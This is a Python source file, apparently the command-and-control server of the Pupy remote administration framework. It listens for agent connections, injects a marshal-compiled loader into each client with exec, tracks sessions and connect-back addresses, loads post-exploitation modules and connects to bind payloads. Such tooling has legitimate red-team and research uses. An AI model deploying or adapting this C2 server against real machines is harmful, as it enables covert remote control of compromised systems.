# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

import threading
from . import PupyService
import pkgutil
import modules
import logging
from .PupyErrors import PupyModuleExit, PupyModuleError
from .PupyJob import PupyJob
from .PupyCmd import color_real
from .PupyCategories import PupyCategories
from network.conf import transports
from pupylib.utils.rpyc_utils import obtain
from .PupyTriggers import on_connect
from network.lib.utils import parse_transports_args
from network.lib.base_launcher import LauncherError
from os import path
from shutil import copyfile
import marshal
import network.conf
import rpyc
import shlex

try:
    import ConfigParser as configparser
except ImportError:
    import configparser
from . import PupyClient
import os.path

class PupyServer(threading.Thread):
    def __init__(self, transport, transport_kwargs, port=None, ipv6=None):
        super(PupyServer, self).__init__()
        self.daemon=True
        self.server=None
        self.authenticator=None
        self.clients=[]
        self.jobs={}
        self.jobs_id=1
        self.clients_lock=threading.Lock()
        self.current_id=1
        self.config = configparser.ConfigParser()
        if not path.exists('pupy.conf'):
            copyfile(
                path.join(
                    path.dirname(__file__), '..', 'pupy.conf.default'
                ),
            'pupy.conf')
        self.config.read("pupy.conf")
        if port is None:
            self.port=self.config.getint("pupyd", "port")
        else:
            self.port=port
        if ipv6 is None:
            self.ipv6=self.config.getboolean("pupyd", "ipv6")
        else:
            self.ipv6=ipv6
        try:
            self.address=self.config.get("pupyd", "address")
            if self.ipv6 and not ":" in self.address:
                logging.warning("ipv4 detected in pupy.conf, only binding on ipv4")
                self.ipv6=False
        except configparser.NoOptionError:
            self.address=''
        if not transport:
            try:
                self.transport=self.config.get("pupyd", "transport")
                if ' ' in self.transport:
                    self.transport, self.transport_kwargs = self.transport.split(' ', 1)
            except configparser.NoOptionError:
                self.transport='ssl'
        else:
            self.transport = transport
        self.handler=None
        self.handler_registered=threading.Event()
        self.transport_kwargs=transport_kwargs
        self.categories=PupyCategories(self)

    def register_handler(self, instance):
        """ register the handler instance, typically a PupyCmd, and PupyWeb in the futur"""
        self.handler=instance
        self.handler_registered.set()

    def add_client(self, conn):
        pc=None
        with open(path.join(path.dirname(__file__), 'PupyClientInitializer.py')) as initializer:
            conn.execute(
                'import marshal;exec marshal.loads({})'.format(
                    repr(marshal.dumps(compile(initializer.read(), '<loader>', 'exec')))
                )
            )

        l=conn.namespace["get_uuid"]()

        with self.clients_lock:
            client_info = {
                "id": self.current_id,
                "conn" : conn,
                "address" : conn._conn._config['connid'].rsplit(':',1)[0],
                "launcher" : conn.get_infos("launcher"),
                "launcher_args" : obtain(conn.get_infos("launcher_args")),
                "transport" : obtain(conn.get_infos("transport")),
                "daemonize" : (True if obtain(conn.get_infos("daemonize")) else False),
            }
            client_info.update(l)
            pc=PupyClient.PupyClient(client_info, self)
            self.clients.append(pc)
            if self.handler:
                addr = conn.modules['pupy'].get_connect_back_host()
                server_ip, server_port = addr.rsplit(':', 1)
                try:
                    client_ip, client_port = conn._conn._config['connid'].rsplit(':', 1)
                except:
                    client_ip, client_port = "0.0.0.0", 0 # TODO for bind payloads

                self.handler.display_srvinfo("Session {} opened ({}:{} <- {}:{})".format(
                    self.current_id, server_ip, server_port, client_ip, client_port))
            self.current_id += 1
        if pc:
            on_connect(pc)

    def remove_client(self, client):
        with self.clients_lock:
            for i,c in enumerate(self.clients):
                if c.conn is client:
                    if self.handler:
                        self.handler.display_srvinfo('Session {} closed'.format(self.clients[i].desc['id']))
                    del self.clients[i]
                    break

    def get_clients(self, search_criteria):
        """ return a list of clients corresponding to the search criteria. ex: platform:*win* """
        #if the criteria is a simple id we return the good client
        try:
            index=int(search_criteria)
            for c in self.clients:
                if int(c.desc["id"])==index:
                    return [c]
            return []
        except Exception:
            pass
        l=set([])
        if search_criteria=="*":
            return self.clients
        for c in self.clients:
            take=False
            for sc in search_criteria.split():
                tab=sc.split(":",1)
                if len(tab)==2 and tab[0] in [x for x in c.desc.iterkeys()]:#if the field is specified we search for the value in this field
                    take=True
                    if not tab[1].lower() in str(c.desc[tab[0]]).lower():
                        take=False
                        break
                elif len(tab)!=2:#if there is no field specified we search in every field for at least one match
                    take=False
                    for k,v in c.desc.iteritems():
                        if type(v) is unicode or type(v) is str:
                            if tab[0].lower() in v.decode('utf8').lower():
                                take=True
                                break
                        else:
                            if tab[0].lower() in str(v).decode('utf8').lower():
                                take=True
                                break
                    if not take:
                        break
            if take:
                l.add(c)
        return list(l)

    def get_clients_list(self):
        return self.clients

    def iter_modules(self):
        """ iterate over all modules """
        l=[]

        for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__ + ['modules']):
            if module_name=="lib":
                continue
            try:
                yield self.get_module(module_name)
            except ImportError as e:
                logging.warning("%s : module %s disabled"%(e, module_name))

    def get_module_completer(self, module_name):
        """ return the module PupyCompleter if any is defined"""
        module=self.get_module(module_name)
        ps=module(None,None)
        return ps.arg_parser.get_completer()

    def get_module_name_from_category(self, path):
        """ take a category virtual path and return the module's name or the path untouched if not found """
        mod=self.categories.get_module_from_path(path)
        if mod:
            return mod.get_name()
        else:
            return path

    def get_aliased_modules(self):
        """ return a list of aliased module names that have to be displayed as commands """
        l=[]
        for m in self.iter_modules():
            if not m.is_module:
                l.append(m.get_name())
        return l

    def get_module(self, name):
        script_found=False
        for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__ + ['modules']):
            if module_name==name:
                script_found=True
                module=loader.find_module(module_name).load_module(module_name)
                class_name=None
                if hasattr(module,"__class_name__"):
                    class_name=module.__class_name__
                    if not hasattr(module,class_name):
                        logging.error("script %s has a class_name=\"%s\" global variable defined but this class does not exists in the script !"%(module_name,class_name))
                if not class_name:
                    #TODO automatically search the class name in the file
                    exit("Error : no __class_name__ for module %s"%module)
                return getattr(module,class_name)

    def module_parse_args(self, module_name, args):
        """ This method is used by the PupyCmd class to verify validity of arguments passed to a specific module """
        module=self.get_module(module_name)
        ps=module(None,None)
        return ps.arg_parser.parse_args(args)

    def del_job(self, job_id):
        if job_id is not None:
            job_id=int(job_id)
            if job_id in self.jobs:
                del self.jobs[job_id]

    def add_job(self, job):
        job.id=self.jobs_id
        self.jobs[self.jobs_id]=job
        self.jobs_id+=1

    def get_job(self, job_id):
        try:
            job_id=int(job_id)
        except ValueError:
            raise PupyModuleError("job id must be an integer !")
        if job_id not in self.jobs:
            raise PupyModuleError("%s: no such job !"%job_id)
        return self.jobs[job_id]

    def connect_on_client(self, launcher_args):
        """ connect on a client that would be running a bind payload """
        launcher=network.conf.launchers["connect"](connect_on_bind_payload=True)
        try:
            launcher.parse_args(shlex.split(launcher_args))
        except LauncherError as e:
            launcher.arg_parser.print_usage()
            return
        stream=launcher.iterate().next()
        self.handler.display_info("Connecting ...")
        conn=rpyc.utils.factory.connect_stream(stream, PupyService.PupyBindService, {})
        bgsrv=rpyc.BgServingThread(conn)
        bgsrv.SLEEP_INTERVAL=0.001 # consume ressources but faster response ...


    def run(self):
        self.handler_registered.wait()
        t=transports[self.transport]()
        transport_kwargs=t.server_transport_kwargs
        if self.transport_kwargs:
            opt_args=parse_transports_args(self.transport_kwargs)
            for val in opt_args:
                if val.lower() in t.server_transport_kwargs:
                    transport_kwargs[val.lower()]=opt_args[val]
                else:
                    logging.warning("unknown transport argument : %s"%val)
        if t.authenticator:
            authenticator=t.authenticator()
        else:
            authenticator=None
        try:
            t.parse_args(transport_kwargs)
        except Exception as e:
            logging.exception(e)

        try:
            self.server = t.server(PupyService.PupyService, port = self.port, hostname=self.address, authenticator=authenticator, stream=t.stream, transport=t.server_transport, transport_kwargs=t.server_transport_kwargs, ipv6=self.ipv6)
            self.server.start()
        except Exception as e:
            logging.exception(e)
